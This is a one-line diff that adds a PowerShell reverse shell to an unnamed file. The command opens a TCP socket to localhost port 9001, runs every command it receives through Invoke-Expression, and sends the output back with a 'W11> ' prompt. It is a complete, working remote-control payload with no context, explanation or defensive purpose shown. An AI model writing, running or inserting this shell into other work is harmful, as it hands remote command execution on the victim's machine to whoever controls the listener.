@@ -1,0 +1,1 @@
+powershell -c "$k = New-Object Net.Sockets.TCPClient('localhost',9001); $s = $k.GetStream(); $b = New-Object byte[] 65536; while(($i = $s.Read($b, 0, $b.Length)) -ne 0){$d = [Text.Encoding]::ASCII.GetString($b, 0, $i); $sb = (iex $d 2>&1 | Out-String ); $sb2 = $sb + 'W11> '; $c = ([text.encoding]::ASCII).GetBytes($sb2); $s.Write($c,0,$c.Length); $s.Flush()}; $k.Close()"
